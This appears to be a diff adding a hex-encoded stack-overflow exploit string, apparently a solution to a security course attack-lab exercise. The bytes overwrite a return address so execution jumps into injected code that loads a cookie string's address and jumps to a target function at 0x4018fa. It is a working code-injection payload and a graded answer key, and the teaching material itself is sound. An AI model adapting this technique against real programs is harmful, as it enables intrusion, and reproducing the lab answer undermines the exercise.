@@ -1,0 +1,16 @@
+48 c7 c7 a8 dc 61 55       /* 0x5561dc78 */
+48 c7 c0 fa 18 40 00       /* 0x5561dc7f */
+ff e0                      /* 0x5561dc86 */
+ff                         /* 0x5561dc88 */
+ff ff ff ff ff ff ff       /* 0x5561dc89 */
+ff ff ff ff ff ff ff ff    /* 0x5561dc90 */
+ff ff ff ff ff ff ff ff    /* 0x5561dc98 */
+78 dc 61 55 00 00 00 00    /* 0x5561dca0 */
+35 39 62 39 39 37 66 61 00 /* 0x5561dca8 */
+
+
+ /* 48 c7 c7 a8 dc 61 55       mov    $0x5561dca8,%rdi      */
+ /* 48 c7 c0 fa 18 40 00       mov    $0x4018fa,%rax        */
+ /* ff e0                      jmp    *%rax                 */
+
+ /* 35 39 62 39 39 37 66 61 00    "59b997fa"                   */
